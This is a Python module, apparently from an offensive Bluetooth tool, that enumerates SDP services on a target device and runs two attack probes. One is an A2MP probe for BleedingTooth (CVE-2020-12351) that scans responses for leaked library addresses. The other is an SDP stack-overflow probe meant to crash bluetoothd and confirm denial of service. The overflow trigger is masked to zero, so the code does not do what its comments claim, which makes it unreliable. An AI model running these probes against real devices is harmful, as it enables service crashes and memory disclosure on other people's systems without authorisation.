import socket
import struct
import subprocess
from dataclasses import dataclass

from src.utils import logger


@dataclass
class SDPService:
    handle:  int
    name:    str
    classes: list[str]
    proto:   list[str]
    raw:     bytes


class SDPProbe:

    PSM = 1

    def __init__(self, target: str, timeout: float = 8.0):
        self.target  = target
        self.timeout = timeout

    def _connect(self):
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET,
                              socket.BTPROTO_L2CAP)
            s.settimeout(self.timeout)
            s.connect((self.target, self.PSM))
            return s
        except OSError as e:
            logger.error(f"L2CAP connect failed: {e}")
            return None

    def _send_recv(self, sock: socket.socket, pdu: bytes):
        sock.send(pdu)
        try:
            return sock.recv(65536)
        except socket.timeout:
            return b""

    def browse(self):
        services: list[SDPService] = []
        try:
            out = subprocess.check_output(
                ["sdptool", "browse", "--tree", self.target],
                timeout=20, stderr=subprocess.STDOUT,
            ).decode(errors="replace")
            logger.success(f"sdptool browse output ({len(out)} chars):\n{out}")
            for line in out.splitlines():
                if "Service Name:" in line:
                    name = line.split("Service Name:")[-1].strip()
                    services.append(SDPService(
                        handle=0, name=name, classes=[], proto=[], raw=b""))
        except FileNotFoundError:
            logger.error("sdptool not found — apt install bluez-tools")
        except subprocess.CalledProcessError as e:
            logger.warning(f"sdptool exited: {e.output.decode(errors='replace')[:500]}")
        return services

    def probe_a2mp(self):
        logger.info(f"Probing A2MP (L2CAP CID 3) on {self.target}…")
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET,
                              socket.BTPROTO_L2CAP)
            s.settimeout(5)
            s.connect((self.target, 3))
            logger.success("A2MP channel reachable — BleedingTooth CVE-2020-12351 may apply")
            pkt = struct.pack("<BBH", 0x05, 0x42, 4) + struct.pack("<I", 0)
            s.send(pkt)
            try:
                resp = s.recv(256)
                logger.data(f"A2MP response ({len(resp)}B): {resp.hex()}")
                for i in range(0, len(resp) - 3, 4):
                    val = struct.unpack_from("<I", resp, i)[0]
                    if 0xb6000000 <= val <= 0xbfffffff:
                        logger.warning(f"  Potential library address @ offset {i}: {val:#010x}")
            except socket.timeout:
                logger.info("No A2MP response (timeout)")
            s.close()
            return True
        except OSError:
            logger.info("A2MP not reachable (BT Classic feature, needs Classic connection)")
            return False

    def probe_sdp_bof(self):
        logger.info(f"SDP BOF probe (SOLID-2026-005) → {self.target}…")
        benign = self._sdp_pdu(max_attr=0x0100, trans_id=0x1111)
        sock = self._connect()
        if sock is None:
            return False
        resp1 = self._send_recv(sock, benign)
        sock.close()
        if not resp1:
            logger.warning("No SDP response to benign probe — target may be offline")
            return False
        logger.info(f"Benign SDP response: {len(resp1)} bytes — service alive")

        overflow = self._sdp_pdu(max_attr=0x10000, trans_id=0x1337)
        sock2 = self._connect()
        if sock2 is None:
            return False
        resp2 = self._send_recv(sock2, overflow)
        sock2.close()

        if not resp2:
            logger.warning("No response after overflow probe — possible CRASH (DoS confirmed)")
            logger.warning("SOLID-2026-005: bluetoothd stack BOF triggered")
            return True
        else:
            logger.info(f"Service still alive ({len(resp2)} bytes) — try adjusting trigger value")
            return False

    def _sdp_pdu(self, max_attr: int, trans_id: int):
        uuid_seq  = b"\x35\x03\x19\x01\x00"
        max_bytes = struct.pack(">H", max_attr & 0xFFFF)
        attr_list = b"\x35\x05\x0a\x00\x00\xff\xff"
        cont      = b"\x00"
        params    = uuid_seq + max_bytes + attr_list + cont
        return struct.pack(">BHH", 0x06, trans_id, len(params)) + params
